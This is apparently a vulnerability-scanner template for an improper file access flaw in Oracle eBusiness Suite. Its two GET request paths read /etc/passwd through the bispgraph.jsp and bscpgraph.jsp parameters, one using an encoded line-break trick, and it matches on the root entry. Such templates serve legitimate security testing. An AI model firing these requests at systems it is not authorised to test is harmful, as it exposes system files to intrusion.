id: oracle-ebs-bispgrapgh-file-read
info:
  name: Oracle eBusiness Suite - Improper File Access
  author: emenalf,tirtha_mandal,thomas_from_offensity
  severity: critical
  description: Oracle eBusiness Suite is vulnerable to improper file access via bispgrapgh,
    without any support for patches or security fixes.
  reference:
  - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
  - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
  tags: oracle,lfi
  metadata:
    impact: The improper file access vulnerability in Oracle eBusiness Suite via bispgrapgh
      can have a significant impact on the security and integrity of sensitive data.
    recommendation: We highly recommend discontinuing use of Oracle eBusiness Suite,
      as it has been identified as vulnerable to improper file access via bispgrapgh
      and is no longer supported with patches or security fixes.
requests:
- method: GET
  path:
  - '{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/'
  - '{{BaseURL}}/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd'
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
